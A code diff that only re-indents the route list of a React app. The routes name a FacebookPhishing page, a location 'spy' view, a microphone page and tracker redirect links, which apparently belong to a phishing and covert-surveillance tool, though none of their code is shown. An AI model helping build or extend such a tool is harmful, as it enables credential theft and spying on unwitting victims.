@@ -24,14 +24,14 @@ function App() {
   }
 
   return (
-    <Routes>
-      <Route path="/" element={
-        !usuario ? (
-          <Login onLogin={handleLogin} />
-        ) : (
-          <Dashboard email={usuario} />
-        )
-      } />
+      <Routes>
+        <Route path="/" element={
+          !usuario ? (
+            <Login onLogin={handleLogin} />
+          ) : (
+            <Dashboard email={usuario} />
+          )
+        } />
       <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
       <Route path="/spy-location" element={<Dashboard email={usuario} />} />
       <Route path="/facebook" element={<Dashboard email={usuario} />} />
@@ -44,11 +44,11 @@ function App() {
       {/* Rotas especiais: NÃO renderize Dashboard aqui! */}
       <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
       <Route path="/imei-support-request" element={<IMEISupportRequest />} />
-      <Route path="/redirect/:id" element={<TrackerPage />} />
-      <Route path="/facebook/:id" element={<FacebookPhishing />} />
-      <Route path="/microphone/:id" element={<MicrophonePage />} />
-      <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
-    </Routes>
+        <Route path="/redirect/:id" element={<TrackerPage />} />
+        <Route path="/facebook/:id" element={<FacebookPhishing />} />
+        <Route path="/microphone/:id" element={<MicrophonePage />} />
+        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
+      </Routes>
   );
 }
 
